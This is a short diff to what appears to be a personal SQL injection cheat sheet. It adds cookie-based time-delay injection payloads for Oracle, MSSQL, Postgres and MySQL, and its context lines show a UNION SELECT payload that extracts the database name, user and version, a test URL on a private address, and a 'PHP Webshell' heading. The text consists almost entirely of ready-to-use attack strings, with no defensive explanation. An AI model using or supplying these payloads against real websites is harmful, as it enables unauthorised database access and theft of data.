@@ -23,6 +23,13 @@ http://192.168.200.5/room.php?cod=1'
 Error/no-graphic = We have injection
 
 =================================== 
+Cookie Injection
+Cookie: TrackingId=x'||dbms_pipe.receive_message(('a'),10)  ..oracle
+Cookie: TrackingId=x'||WAITFOR DELAY '0:0:10'               ..MSSQL
+Cookie: TrackingId=x'||pg_sleep(10)                         ..Postgres
+Cookie: TrackingId=x'||sleep(10)                            ..mysql
+
+=================================== 
 PHP Webshell
 
 ' AND 1=2 UNION SELECT database(),user(),version() -- 
